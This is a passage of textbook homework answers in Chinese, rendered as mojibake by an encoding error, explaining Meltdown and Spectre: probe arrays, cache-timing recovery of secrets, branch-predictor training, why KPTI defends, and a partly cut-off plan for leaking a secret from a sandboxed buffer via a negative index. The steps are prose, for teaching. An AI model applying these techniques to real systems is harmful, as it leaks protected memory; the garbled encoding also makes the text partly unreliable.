**ä¸­æ–‡ç¿»è¯‘:** ä¸€ä¸ªç§˜å¯†æ•°å­—å­˜å‚¨åœ¨å†…æ ¸åœ°å€ `0xfb102000`ã€‚ä½ æ­£è¯•å›¾å°†å®ƒæ‰“å°å‡ºæ¥ã€‚è¯·ç”¨é€šä¿—çš„è¯­è¨€æè¿°ä½ å°†å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹ã€‚

**è§£æ:**
è¿™æ˜¯ **ç†”æ–­æ”»å‡» (Meltdown Attack)** çš„æ ¸å¿ƒæ€æƒ³ï¼Œå¦‚æ•™æç¬¬1ç« æ‰€è¿°ã€‚æˆ‘ä¼šé€šè¿‡ä»¥ä¸‹æ­¥éª¤æ¥çªƒå–å¹¶â€œæ‰“å°â€è¿™ä¸ªç§˜å¯†ï¼š
1.  **è®¾ç½®é™·é˜±å¹¶åšå¥½å‡†å¤‡**: é¦–å…ˆï¼Œæˆ‘ä¼šè®¾ç½®ä¸€ä¸ªå¼‚å¸¸å¤„ç†ç¨‹åºã€‚è¿™å°±åƒåœ¨æ‚¬å´–è¾¹è®¾ç½®ä¸€ä¸ªå®‰å…¨ç½‘ï¼Œå› ä¸ºæˆ‘çŸ¥é“æˆ‘æ¥ä¸‹æ¥çš„æ“ä½œä¼šâ€œå è½â€ï¼ˆå³ç¨‹åºä¼šå´©æºƒï¼‰ã€‚åŒæ—¶ï¼Œæˆ‘å‡†å¤‡ä¸€ä¸ªåŒ…å«256ä¸ªâ€œæˆ¿é—´â€ï¼ˆæ¢æµ‹æ•°ç»„çš„å…ƒç´ ï¼‰çš„å¤§æ¥¼ï¼Œå¹¶ç¡®ä¿æ‰€æœ‰æˆ¿é—´çš„ç¯éƒ½æ˜¯å…³çš„ï¼ˆå°†æ¢æµ‹æ•°ç»„ä»ç¼“å­˜ä¸­åˆ·æ–°ï¼‰ã€‚
2.  **åˆ¶é€ æ··ä¹±ï¼Œç¬é—´çªƒå–**: åœ¨å¼‚å¸¸å¤„ç†ç¨‹åºçš„ä¿æŠ¤ä¸‹ï¼Œæˆ‘æ‰§è¡Œä¸€ä¸ªéæ³•çš„æ“ä½œï¼šè¯»å–å†…æ ¸åœ°å€ `0xfb102000` é‡Œçš„ç§˜å¯†æ•°å­—ã€‚æˆ‘çŸ¥é“è¿™ä¼šç«‹å³è§¦å‘è­¦æŠ¥ï¼ˆç¡¬ä»¶å¼‚å¸¸ï¼‰ã€‚ä½†ç°ä»£CPUä¸ºäº†è¿½æ±‚é€Ÿåº¦ï¼Œä¼šè¿›è¡Œ **ä¹±åºæ‰§è¡Œ (Out-of-Order Execution)**ã€‚åœ¨è­¦æŠ¥æ­£å¼å“èµ·ã€æˆ‘çš„æ“ä½œè¢«æ’¤é”€å‰çš„æå…¶çŸ­æš‚çš„ç¬é—´ï¼ŒCPUå·²ç»â€œå·çœ‹â€åˆ°äº†ç§˜å¯†æ•°å­—ï¼ˆå‡è®¾æ˜¯Sï¼‰ã€‚
3.  **ç•™ä¸‹çº¿ç´¢**: ç´§æ¥ç€ï¼Œæˆ‘åˆ©ç”¨è¿™ä¸ªå·çœ‹åˆ°çš„ç§˜å¯†å€¼Sï¼Œå»è®¿é—®æˆ‘å‡†å¤‡çš„å¤§æ¥¼é‡Œçš„ç¬¬Så·æˆ¿é—´ `probe_array[S * 4096]`ã€‚è¿™ä¸ªåŠ¨ä½œå°±åƒæ˜¯ç¬é—´æ‰“å¼€äº†ç¬¬Så·æˆ¿é—´çš„ç¯ã€‚è™½ç„¶CPUå¾ˆå¿«ä¼šæ„è¯†åˆ°ä¹‹å‰çš„è¯»å–æ˜¯é”™è¯¯çš„ï¼Œå¹¶æ’¤é”€ä¸€åˆ‡ï¼ˆç¨‹åºè·³è½¬åˆ°å¼‚å¸¸å¤„ç†ï¼Œå¯„å­˜å™¨é‡Œçš„ç§˜å¯†å€¼è¢«ä¸¢å¼ƒï¼‰ï¼Œä½†é‚£ä¸ªæˆ¿é—´çš„â€œç¯â€ï¼ˆCPUç¼“å­˜ï¼‰å´å·²ç»è¢«ç‚¹äº®äº†ï¼ŒCPUâ€œå¿˜è®°â€æŠŠå®ƒå…³æ‰ã€‚
4.  **å¯»æ‰¾çº¿ç´¢**: æˆ‘çš„ç¨‹åºå› ä¸ºå®‰å…¨ç½‘æ²¡æœ‰å´©æºƒï¼Œè€Œæ˜¯è·³è½¬åˆ°äº†å¼‚å¸¸å¤„ç†ä»£ç ã€‚ç°åœ¨ï¼Œæˆ‘å¿«é€Ÿåœ°æ£€æŸ¥å¤§æ¥¼é‡Œçš„æ¯ä¸€ä¸ªæˆ¿é—´ï¼Œæµ‹é‡è¿›å…¥æ¯ä¸ªæˆ¿é—´çš„é€Ÿåº¦ã€‚ç”±äºç¬¬Så·æˆ¿é—´çš„ç¯æ˜¯äº®çš„ï¼ˆæ•°æ®åœ¨ç¼“å­˜é‡Œï¼‰ï¼Œè¿›å…¥è¿™ä¸ªæˆ¿é—´çš„é€Ÿåº¦ä¼šç‰¹åˆ«å¿«ã€‚
5.  **æ­ç¤ºç§˜å¯†**: ä¸€æ—¦æˆ‘æ‰¾åˆ°äº†è®¿é—®æœ€å¿«çš„é‚£ä¸ªæˆ¿é—´ï¼Œå®ƒçš„æˆ¿é—´å·Så°±æ˜¯æˆ‘çªƒå–åˆ°çš„ç§˜å¯†æ•°å­—ã€‚æˆ‘å¯ä»¥é‡å¤è¿™ä¸ªè¿‡ç¨‹æ¥çªƒå–æ›´å¤šçš„ç§˜å¯†å­—èŠ‚ã€‚

---

### **H.7.**
**ä¸­æ–‡ç¿»è¯‘:** ä¸ºäº†æé«˜ **ç†”æ–­æ”»å‡» (Meltdown Attack)** çš„æˆåŠŸç‡ï¼Œç›®æ ‡å†…æ ¸å†…å­˜æœ€å¥½å·²ç»è¢«CPUç¼“å­˜äº†ã€‚ä¸ºä»€ä¹ˆï¼Ÿ

**è§£æ:**
å› ä¸ºç†”æ–­æ”»å‡»æœ¬è´¨ä¸Šæ˜¯ä¸€åœº **ç«æ€æ¡ä»¶ (Race Condition)**ï¼šå³ä¹±åºæ‰§è¡Œä¸­â€œæ•°æ®åŠ è½½â€æ“ä½œä¸â€œæƒé™æ£€æŸ¥â€æ“ä½œä¹‹é—´çš„é€Ÿåº¦ç«èµ›ã€‚
å¦‚æ•™æ1.5.2èŠ‚â€œé€šè¿‡ç¼“å­˜é¢„è½½æå‡æ”»å‡»æ•ˆç‡â€æ‰€è¿°ï¼Œå½“CPUé‡åˆ°è¯»å–å†…æ ¸å†…å­˜çš„æŒ‡ä»¤æ—¶ï¼Œå®ƒä¼šåŒæ—¶å¼€å§‹åŠ è½½æ•°æ®å’Œæ£€æŸ¥è®¿é—®æƒé™ã€‚
-   **å¦‚æœç›®æ ‡å†…æ ¸æ•°æ®å·²åœ¨ç¼“å­˜ä¸­**: æ•°æ®åŠ è½½ä¼šéå¸¸å¿«ã€‚è¿™ç»™äº†CPUä¸€ä¸ªæ›´é•¿çš„æ—¶é—´çª—å£ï¼Œåœ¨ç¼“æ…¢çš„æƒé™æ£€æŸ¥å®Œæˆå¹¶æŠ¥å‘Šé”™è¯¯ä¹‹å‰ï¼Œå»ä¹±åºæ‰§è¡Œåç»­çš„ã€åˆ©ç”¨è¯¥ç§˜å¯†æ•°æ®çš„æŒ‡ä»¤ï¼ˆä¾‹å¦‚è®¿é—®æ¢æµ‹æ•°ç»„ï¼‰ã€‚è¿™å¤§å¤§å¢åŠ äº†æ”»å‡»æˆåŠŸçš„æ¦‚ç‡ã€‚
-   **å¦‚æœç›®æ ‡å†…æ ¸æ•°æ®ä¸åœ¨ç¼“å­˜ä¸­**: CPUéœ€è¦ä»ä¸»å†…å­˜ä¸­è¯»å–æ•°æ®ï¼Œè¿™ä¸ªè¿‡ç¨‹å¾ˆæ…¢ã€‚å¾ˆå¯èƒ½åœ¨æ•°æ®è¿˜æ²¡è¢«åŠ è½½å®Œæˆæ—¶ï¼Œæƒé™æ£€æŸ¥å°±å·²ç»ç»“æŸå¹¶æŠ›å‡ºå¼‚å¸¸ã€‚è¿™æ ·ï¼Œä¹±åºæ‰§è¡Œå°±ä¼šè¢«ç«‹å³ä¸­æ–­ï¼Œåç»­çš„æ”»å‡»æŒ‡ä»¤æ ¹æœ¬æ²¡æœ‰æœºä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´æ”»å‡»å¤±è´¥ã€‚

---

### **H.8.**
**ä¸­æ–‡ç¿»è¯‘:** å¦‚æœCPUä¸æ”¯æŒ **ä¹±åºæ‰§è¡Œ (Out-of-Order Execution)**ï¼Œæˆ‘ä»¬è¿˜èƒ½å‘èµ· **ç†”æ–­æ”»å‡» (Meltdown Attack)** å—ï¼Ÿæœ‰ä»€ä¹ˆç¼ºç‚¹ï¼Ÿ

**è§£æ:**
ä¸èƒ½ã€‚å¦‚æœCPUä¸æ”¯æŒä¹±åºæ‰§è¡Œï¼Œç†”æ–­æ”»å‡»å°†æ— æ³•å‘èµ·ã€‚
ç†”æ–­æ”»å‡»çš„æ ¹æœ¬åŸç†åœ¨äºï¼ŒCPUåœ¨ç­‰å¾…ä¸€ä¸ªï¼ˆå¯èƒ½å¾ˆæ…¢çš„ï¼‰æŒ‡ä»¤ï¼ˆå¦‚æƒé™æ£€æŸ¥ï¼‰å®Œæˆæ—¶ï¼Œä¼šæå‰æ‰§è¡Œåç»­çš„æŒ‡ä»¤ã€‚æ­£æ˜¯è¿™ç§â€œæå‰æ‰§è¡Œâ€çš„æœºåˆ¶ï¼Œä½¿å¾—åœ¨æƒé™æ£€æŸ¥å¤±è´¥çš„å¼‚å¸¸è¢«æ­£å¼å¤„ç†ä¹‹å‰ï¼Œåˆ©ç”¨ç§˜å¯†æ•°æ®çš„æŒ‡ä»¤èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œä»è€Œåœ¨ç¼“å­˜ä¸­ç•™ä¸‹ç—•è¿¹ã€‚
å¦‚æœCPUæ˜¯ä¸¥æ ¼æŒ‰é¡ºåºæ‰§è¡Œçš„ï¼Œå®ƒä¼šæ‰§è¡Œè®¿é—®å†…æ ¸å†…å­˜çš„æŒ‡ä»¤ï¼Œç­‰å¾…æƒé™æ£€æŸ¥çš„ç»“æœã€‚ä¸€æ—¦æ£€æŸ¥å¤±è´¥ï¼Œå®ƒä¼šç«‹å³è§¦å‘å¼‚å¸¸ï¼Œè€Œæ ¹æœ¬ä¸ä¼šå»çœ‹ä¸‹ä¸€æ¡æŒ‡ä»¤æ˜¯ä»€ä¹ˆï¼Œåç»­çš„ä¾§ä¿¡é“æ³„éœ²æŒ‡ä»¤ä¹Ÿå°±æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œã€‚
ç¼ºç‚¹æ˜¯ï¼Œä¸æ”¯æŒä¹±åºæ‰§è¡Œçš„CPUæ€§èƒ½ä¼šå¤§å¤§é™ä½ï¼Œå› ä¸ºå®ƒä»¬æ— æ³•æœ‰æ•ˆåˆ©ç”¨æŒ‡ä»¤çº§çš„å¹¶è¡Œæ€§ï¼Œå¯¼è‡´å¤§é‡çš„å¤„ç†å™¨èµ„æºåœ¨ç­‰å¾…ä¸­è¢«æµªè´¹ã€‚

---

### **H.9.**
**ä¸­æ–‡ç¿»è¯‘:** **KAISER** å¯ä»¥ç”¨æ¥é˜²å¾¡ **ç†”æ–­æ”»å‡» (Meltdown Attack)**ã€‚å®ƒçš„ä¸»è¦æ€æƒ³æ˜¯ä¸åœ¨ç”¨æˆ·ç©ºé—´æ˜ å°„å†…æ ¸å†…å­˜ã€‚è¯·è§£é‡Šä¸ºä»€ä¹ˆè¿™ä¸ªæ–¹æ³•æœ‰æ•ˆã€‚

**è§£æ:**
KAISER (ç°åœ¨æ›´åä¸ºå†…æ ¸é¡µè¡¨éš”ç¦», KPTI) ä¹‹æ‰€ä»¥æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºå®ƒä»æ ¹æœ¬ä¸Šæ¶ˆé™¤äº†ç†”æ–­æ”»å‡»çš„å‰ææ¡ä»¶ã€‚
å¦‚æ•™æ1.6èŠ‚â€œCountermeasuresâ€æ‰€è¿°ï¼Œç†”æ–­æ”»å‡»ä¹‹æ‰€ä»¥èƒ½æˆåŠŸï¼Œæ˜¯å› ä¸ºåœ¨ä¼ ç»Ÿçš„æ“ä½œç³»ç»Ÿè®¾è®¡ä¸­ï¼Œä¸ºäº†æ–¹ä¾¿ç³»ç»Ÿè°ƒç”¨å’Œä¸­æ–­å¤„ç†ï¼Œæ•´ä¸ªå†…æ ¸ç©ºé—´çš„åœ°å€éƒ½è¢«æ˜ å°„åˆ°äº†æ¯ä¸€ä¸ªç”¨æˆ·è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼ˆå°½ç®¡æœ‰æƒé™ä½ä¿æŠ¤ï¼‰ã€‚æ”»å‡»ç¨‹åºè™½ç„¶æ²¡æœ‰æƒé™è®¿é—®ï¼Œä½†åœ°å€æœ¬èº«æ˜¯æœ‰æ•ˆçš„ã€å¯è§£æçš„ã€‚
KAISERæ”¹å˜äº†è¿™ä¸€ç‚¹ã€‚å½“ä»£ç åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹è¿è¡Œæ—¶ï¼Œå®ƒä¼šåˆ‡æ¢åˆ°ä¸€å¥—å‡ ä¹å®Œå…¨ä¸åŒ…å«å†…æ ¸æ˜ å°„çš„â€œç”¨æˆ·æ€é¡µè¡¨â€ã€‚åœ¨è¿™å¥—é¡µè¡¨ä¸‹ï¼Œé‚£äº›æ•æ„Ÿçš„å†…æ ¸åœ°å€ï¼ˆå¦‚ `0xfb102000`ï¼‰æ˜¯å®Œå…¨æ— æ•ˆå’Œä¸å¯è§£æçš„ã€‚å½“æ”»å‡»ä»£ç å°è¯•å¯¹è¿™ä¸ªåœ°å€è¿›è¡Œä¹±åºè¯»å–æ—¶ï¼Œåœ°å€è½¬æ¢å°±ä¼šç«‹å³å¤±è´¥ï¼Œä»è€Œå¼•å‘ä¸€ä¸ªæ›´æ—©ã€æ›´æ ¹æœ¬çš„å¼‚å¸¸ï¼ˆé¡µé”™è¯¯ï¼‰ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªæƒé™å¼‚å¸¸ã€‚è¿™ä½¿å¾—CPUç”šè‡³æ²¡æœ‰æœºä¼šå»å¯åŠ¨å¯¹å†…å­˜çš„æ¨æµ‹æ€§è®¿é—®ï¼Œå› æ­¤åç»­çš„ä¾§ä¿¡é“æ”»å‡»æ­¥éª¤ä¹Ÿå°±ä¸å¯èƒ½å‘ç”Ÿäº†ã€‚

---

### **H.10.**
**ä¸­æ–‡ç¿»è¯‘:** åœ¨ **å¹½çµæ”»å‡» (Spectre Attack)** ä¸­ï¼Œæˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦â€œè®­ç»ƒâ€CPUï¼Ÿ

**è§£æ:**
åœ¨å¹½çµæ”»å‡»ä¸­ï¼Œâ€œè®­ç»ƒâ€CPUçš„ç›®çš„æ˜¯ä¸ºäº†æ¬ºéª—CPUçš„ **åˆ†æ”¯é¢„æµ‹ (Branch Prediction)** å•å…ƒã€‚
å¦‚æ•™æ2.2èŠ‚â€œä¹±åºæ‰§è¡Œä¸åˆ†æ”¯é¢„æµ‹â€æ‰€è¿°ï¼Œå¹½çµæ”»å‡»ä¾èµ–äºè®©CPUé”™è¯¯åœ° **æ¨æµ‹æ‰§è¡Œ (Speculative Execution)** ä¸€ä¸ªæœ¬ä¸åº”è¯¥è¢«æ‰§è¡Œçš„ä»£ç åˆ†æ”¯ã€‚ä¸ºäº†åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ”»å‡»è€…éœ€è¦æ“æ§åˆ†æ”¯é¢„æµ‹å™¨çš„â€œå†å²è®°å½•â€ã€‚
å…·ä½“æ¥è¯´ï¼Œæ”»å‡»è€…ä¼šé‡å¤åœ°ä½¿ç”¨åˆæ³•çš„ã€åœ¨è¾¹ç•Œå†…çš„è¾“å…¥å€¼è°ƒç”¨ç›®æ ‡å‡½æ•°ï¼ˆä¾‹å¦‚ä¸€ä¸ªæœ‰è¾¹ç•Œæ£€æŸ¥çš„å‡½æ•°ï¼‰ã€‚è¿™ä¼šè®©åˆ†æ”¯é¢„æµ‹å™¨â€œå­¦ä¹ â€å¹¶å½¢æˆä¸€ä¸ªå¼ºå¤§çš„åè§ï¼Œè®¤ä¸ºâ€œè¿™ä¸ªåˆ†æ”¯æ¡ä»¶é€šå¸¸æ˜¯çœŸçš„â€ã€‚
å½“è®­ç»ƒå®Œæˆåï¼Œæ”»å‡»è€…å†æä¾›ä¸€ä¸ªæ¶æ„çš„ã€è¶Šç•Œçš„è¾“å…¥å€¼ã€‚æ­¤æ—¶ï¼Œç”±äºåˆ†æ”¯æ¡ä»¶ï¼ˆå¦‚ `x < size`ï¼‰çš„åˆ¤æ–­å¯èƒ½éœ€è¦æ—¶é—´ï¼ˆç‰¹åˆ«æ˜¯å½“`size`ä¸åœ¨ç¼“å­˜ä¸­æ—¶ï¼‰ï¼Œåˆ†æ”¯é¢„æµ‹å™¨ä¼šåŸºäºä¹‹å‰çš„â€œç»éªŒâ€åšå‡ºé¢„æµ‹ï¼Œå³â€œæ¡ä»¶ä¸ºçœŸâ€ï¼Œå¹¶æ¨æµ‹æ€§åœ°æ‰§è¡Œåˆ†æ”¯å†…çš„ä»£ç ã€‚æ­£æ˜¯è¿™æ¬¡é”™è¯¯çš„æ¨æµ‹æ‰§è¡Œï¼Œå¯¼è‡´äº†ç§˜å¯†æ•°æ®çš„æ³„éœ²ã€‚æ²¡æœ‰é¢„å…ˆçš„è®­ç»ƒï¼Œåˆ†æ”¯é¢„æµ‹å™¨å¯èƒ½ä¸ä¼šåšå‡ºæ”»å‡»è€…æ‰€æœŸæœ›çš„é¢„æµ‹ï¼Œæ”»å‡»ä¹Ÿå°±ä¸ä¼šæˆåŠŸã€‚

---

### **H.11.**
**ä¸­æ–‡ç¿»è¯‘:** å¦‚æœCPUä¸æ”¯æŒ **ä¹±åºæ‰§è¡Œ (Out-of-Order Execution)**ï¼Œæˆ‘ä»¬è¿˜èƒ½å‘èµ· **å¹½çµæ”»å‡» (Spectre Attack)** å—ï¼Ÿ

**è§£æ:**
ä¸èƒ½ã€‚ä¸ç†”æ–­æ”»å‡»ä¸€æ ·ï¼Œå¹½çµæ”»å‡»ä¹Ÿå®Œå…¨ä¾èµ–äºCPUçš„ **æ¨æµ‹æ‰§è¡Œ (Speculative Execution)** èƒ½åŠ›ï¼Œè€Œæ¨æµ‹æ‰§è¡Œæ˜¯ä¹±åºæ‰§è¡Œçš„ä¸€ç§æ ¸å¿ƒä½“ç°ã€‚
å¹½çµæ”»å‡»çš„åŸç†æ˜¯ï¼Œåœ¨CPUæœ€ç»ˆç¡®å®šä¸€ä¸ªåˆ†æ”¯æ¡ä»¶çš„ç»“æœä¹‹å‰ï¼Œå®ƒä¼šæ ¹æ®é¢„æµ‹æå‰æ‰§è¡Œè¯¥åˆ†æ”¯åçš„æŒ‡ä»¤æµã€‚å¦‚æœé¢„æµ‹é”™è¯¯ï¼Œæ‰€æœ‰æ¨æµ‹æ‰§è¡Œçš„ç»“æœéƒ½ä¼šè¢«å›æ»šã€‚æ”»å‡»æ­£æ˜¯åˆ©ç”¨äº†å›æ»šæ“ä½œä¸ä¼šæ¸…é™¤CPUç¼“å­˜çŠ¶æ€è¿™ä¸€æ¼æ´ã€‚
å¦‚æœCPUä¸æ”¯æŒä¹±åºæ‰§è¡Œï¼Œå®ƒä¼šä¸¥æ ¼åœ°ç­‰å¾…åˆ†æ”¯æ¡ä»¶ï¼ˆ`if (x < size)`ï¼‰è¢«å®Œå…¨è®¡ç®—å‡ºç»“æœåï¼Œæ‰å†³å®šæ˜¯å¦æ‰§è¡Œåˆ†æ”¯å†…çš„ä»£ç ã€‚å¯¹äºä¸€ä¸ªè¶Šç•Œçš„è¾“å…¥`x`ï¼Œæ¡ä»¶åˆ¤æ–­ç»“æœä¸ºå‡ï¼Œåˆ†æ”¯å†…çš„ä»£ç å°†æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œï¼Œæ— è®ºæ˜¯æ¨æµ‹æ€§åœ°è¿˜æ˜¯éæ¨æµ‹æ€§åœ°ã€‚å› æ­¤ï¼Œæ”»å‡»æ— æ³•è¿›è¡Œã€‚

---

### **H.12.**
**ä¸­æ–‡ç¿»è¯‘:** åœ¨ **å¹½çµæ”»å‡» (Spectre Attack)** çš„åœºæ™¯ä¸­ï¼Œå—ä¿æŠ¤çš„å†…å­˜å’Œæ”»å‡»è€…ç¨‹åºåœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œä¸ºä»€ä¹ˆæ”»å‡»è€…ä¸èƒ½ç›´æ¥è®¿é—®å—ä¿æŠ¤çš„å†…å­˜ï¼Ÿ

**è§£æ:**
å› ä¸ºå®ƒä»¬ä¹‹é—´å­˜åœ¨ç”±è½¯ä»¶å®ç°çš„ **æ²™ç®± (Sandbox)** éš”ç¦»æœºåˆ¶ã€‚
å¦‚æ•™æ2.3èŠ‚æ‰€è¿°ï¼Œè™½ç„¶ä»æ“ä½œç³»ç»Ÿçš„è§’åº¦çœ‹ï¼Œæ”»å‡»è€…ä»£ç å’Œå—å®³è€…æ•°æ®åœ¨åŒä¸€ä¸ªè™šæ‹Ÿåœ°å€ç©ºé—´å†…ï¼Œä½†åœ¨ç¨‹åºé€»è¾‘å±‚é¢ï¼Œå®ƒä»¬è¢«è®¾è®¡ä¸ºäº’ç›¸éš”ç¦»ã€‚ä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ˜¯Webæµè§ˆå™¨ï¼Œå…¶ä¸­æ¥è‡ªä¸åŒç½‘ç«™çš„JavaScriptä»£ç åœ¨åŒä¸€ä¸ªæµè§ˆå™¨è¿›ç¨‹ä¸­è¿è¡Œï¼Œä½†æµè§ˆå™¨é€šè¿‡æ²™ç®±æœºåˆ¶ä¸¥æ ¼ç¦æ­¢å®ƒä»¬äº’ç›¸è®¿é—®æ•°æ®ã€‚
æ•™æä¸­çš„ `restrictedAccess()` å‡½æ•°å°±æ˜¯è¿™ç§æ²™ç®±çš„ä¸€ä¸ªç®€åŒ–æ¨¡å‹ã€‚å®ƒé€šè¿‡ä¸€ä¸ª `if` è¯­å¥ï¼ˆ`if (x <= bound_upper && x >= bound_lower)`ï¼‰æ¥æ‰§è¡Œè¾¹ç•Œæ£€æŸ¥ï¼Œè¿™æ˜¯ä¸€ç§è½¯ä»¶å±‚é¢çš„ä¿æŠ¤ã€‚ä»»ä½•ç›´æ¥è®¿é—®éƒ½ä¼šè¢«è¿™ä¸ªè½¯ä»¶æ£€æŸ¥æ‰€é˜»æ­¢ã€‚å¹½çµæ”»å‡»çš„ç²¾å¦™ä¹‹å¤„å°±åœ¨äºï¼Œå®ƒä¸æ˜¯æ”»å‡»ç¡¬ä»¶å±‚é¢çš„å†…å­˜ä¿æŠ¤ï¼ˆå¦‚ç†”æ–­æ”»å‡»ï¼‰ï¼Œè€Œæ˜¯åˆ©ç”¨CPUçš„æ¨æµ‹æ‰§è¡Œæ¥ç»•è¿‡è¿™ä¸ªè½¯ä»¶å±‚é¢çš„ `if` æ£€æŸ¥ã€‚

---

### **H.13.**
**ä¸­æ–‡ç¿»è¯‘:** å½“æˆ‘ä»¬è¿è¡Œä¹¦ä¸­åˆ—å‡ºçš„ `SpectreAttack.c` ç¨‹åºæ—¶ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬æ€»èƒ½åœ¨ç¼“å­˜ä¸­çœ‹åˆ° `array[0*4096 + DELTA]`ï¼Ÿ

**è§£æ:**
è¿™æ˜¯å› ä¸ºä»£ç  `array[s*4096 + DELTA] += 88;` åœ¨ç¨‹åºçš„æ‰§è¡Œæµä¸­å®é™…ä¸Šè¢«æ‰§è¡Œäº†ä¸¤æ¬¡ï¼Œä¸€æ¬¡æ˜¯æ¨æµ‹æ€§çš„ï¼Œä¸€æ¬¡æ˜¯ä½“ç³»ç»“æ„æ€§çš„ï¼ˆå³æœ€ç»ˆç¡®å®šçš„ï¼‰ã€‚
å¦‚æ•™æ2.3èŠ‚æœ«å°¾çš„â€œæ‰§è¡Œç»“æœâ€åˆ†ææ‰€è¿°ï¼š
1.  **ç¬¬ä¸€æ¬¡æ‰§è¡Œ (æ¨æµ‹æ€§)**: åœ¨è¢«è®­ç»ƒè¿‡çš„CPUè¿›è¡Œæ¨æµ‹æ‰§è¡Œæ—¶ï¼Œ`restrictedAccess()` å‡½æ•°é”™è¯¯åœ°è¿”å›äº†ç§˜å¯†å€¼ï¼Œå¹¶èµ‹ç»™äº†å˜é‡ `s`ã€‚æ­¤æ—¶ï¼Œ`array[secret_value * 4096 + DELTA]` è¢«è®¿é—®ï¼Œå…¶å†…å®¹è¢«åŠ è½½åˆ°ç¼“å­˜ä¸­ã€‚
2.  **ç¬¬äºŒæ¬¡æ‰§è¡Œ (ä½“ç³»ç»“æ„æ€§)**: éšåï¼ŒCPUå‘ç°åˆ†æ”¯é¢„æµ‹æ˜¯é”™è¯¯çš„ï¼Œäºæ˜¯å›æ»šäº†æ‰€æœ‰æ¨æµ‹æ‰§è¡Œçš„ç»“æœã€‚ç¨‹åºçŠ¶æ€æ¢å¤åˆ°åˆ†æ”¯åˆ¤æ–­ä¹‹å‰ï¼Œç„¶åé‡æ–°ä»¥æ­£å¸¸é¡ºåºæ‰§è¡Œã€‚åœ¨æ­£å¸¸æ‰§è¡Œæµç¨‹ä¸­ï¼Œç”±äºè¾¹ç•Œæ£€æŸ¥å¤±è´¥ï¼Œ`restrictedAccess()` å‡½æ•°æŒ‰ç…§å…¶ä»£ç é€»è¾‘ï¼Œ**æ€»æ˜¯è¿”å› 0**ã€‚è¿™ä¸ª0è¢«èµ‹ç»™å˜é‡ `s`ã€‚å› æ­¤ï¼Œ`array[0*4096 + DELTA] += 88;` è¿™è¡Œä»£ç è¢«å†æ¬¡æ‰§è¡Œï¼Œå¯¼è‡´ `array[0]` å¯¹åº”çš„ç¼“å­˜è¡Œè¢«è®¿é—®ã€‚

æ‰€ä»¥ï¼Œæ— è®ºæ”»å‡»æ˜¯å¦æˆåŠŸè·å–äº†ç§˜å¯†å€¼ï¼Œ`array[0]` æœ€ç»ˆæ€»æ˜¯ä¼šè¢«è®¿é—®ä¸€æ¬¡ï¼Œå› æ­¤å®ƒæ€»æ˜¯ä¼šå‡ºç°åœ¨ç¼“å­˜ä¸­ã€‚æ”»å‡»æˆåŠŸçš„æ ‡å¿—æ˜¯ï¼Œé™¤äº† `array[0]` ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ª `array[secret_value]` ä¹Ÿåœ¨ç¼“å­˜ä¸­ã€‚

---

### **H.14.**
**ä¸­æ–‡ç¿»è¯‘:** ä½ çš„ç¨‹åºåœ¨ä¸€ä¸ª **æ²™ç®± (Sandbox)** ä¸­è¿è¡Œï¼Œå®ƒè¢«å…è®¸è®¿é—®ä¸€ä¸ªå—ä¿æŠ¤ç¼“å†²åŒºçš„å‰100ä¸ªå…ƒç´ ï¼›è®¿é—®å¿…é¡»é€šè¿‡ä¸‹é¢çš„æ²™ç®±APIè¿›è¡Œã€‚ç¼“å†²åŒºçš„åœ°å€åœ¨ `0xbfff0200`ã€‚æœ‰ä¸€ä¸ªç§˜å¯†æ•°å­—å­˜å‚¨åœ¨ `0xbfff0100`ï¼Œä½†ä½ çš„ç¨‹åºå› ä¸ºæ²™ç®±ä¿æŠ¤æ— æ³•è®¿é—®å®ƒã€‚ä½ èƒ½è·å–è¿™ä¸ªç§˜å¯†æ•°å­—å—ï¼Ÿå¦‚æœå¯ä»¥ï¼Œè¯·æè¿°å¦‚ä½•åšã€‚

```c
int low = 0;
int high = 100;
int restrictedAccess(int x)
{
  if (x > low && x < high) {
    return buffer[x];
  } else {
    return 0;
  }
}
```

**è§£æ:**
å¯ä»¥ï¼Œè¿™æ­£æ˜¯ **å¹½çµæ”»å‡» (Spectre Attack)** çš„å…¸å‹åº”ç”¨åœºæ™¯ã€‚æˆ‘ä¼šæŒ‰ç…§æ•™æç¬¬2ç« æè¿°çš„æ­¥éª¤æ¥è·å–è¿™ä¸ªç§˜å¯†æ•°å­—ï¼š
1.  **è®¡ç®—æ¶æ„ç´¢å¼•**: æˆ‘éœ€è¦æ„é€ ä¸€ä¸ªç´¢å¼• `x`ï¼Œä½¿å¾— `buffer[x]` èƒ½å¤ŸæŒ‡å‘ç§˜å¯†åœ°å€ã€‚
    -   `buffer` çš„åŸºåœ°å€æ˜¯ `0xbfff0200`ã€‚
    -   ç§˜å¯†åœ°å€æ˜¯ `0xbfff0100`ã€‚
    -   å› æ­¤ï¼Œæ¶æ„ç´¢å¼• `x` = `secret_address` - `buffer_address` = `0xbfff0100` - `0xbfff0200`ã€‚è¿™æ˜¯ä¸€ä¸ªè´Ÿæ•°åç§»é‡ã€‚

2.  **è®­ç»ƒåˆ†æ”¯é¢„æµ‹å™¨**: æˆ‘ä¼šå†™ä¸€ä¸ªå¾ªç¯ï¼Œå¤šæ¬¡è°ƒç”¨ `restrictedAccess(i)`ï¼Œå…¶ä¸­ `i` æ˜¯ä¸€ä¸ªåœ¨ `(0, 100)` èŒƒå›´å†…çš„åˆæ³•å€¼ã€‚ä¾‹å¦‚ï¼Œå¾ªç¯10æ¬¡ï¼Œ`i` ä»1åˆ°10ã€‚è¿™å°†è®­ç»ƒCPUçš„åˆ†æ”¯é¢„æµ‹å™¨ï¼Œè®©å®ƒç›¸ä¿¡ `if (x > low && x < high)` è¿™ä¸ªæ¡ä»¶é€šå¸¸ä¸ºçœŸã€‚

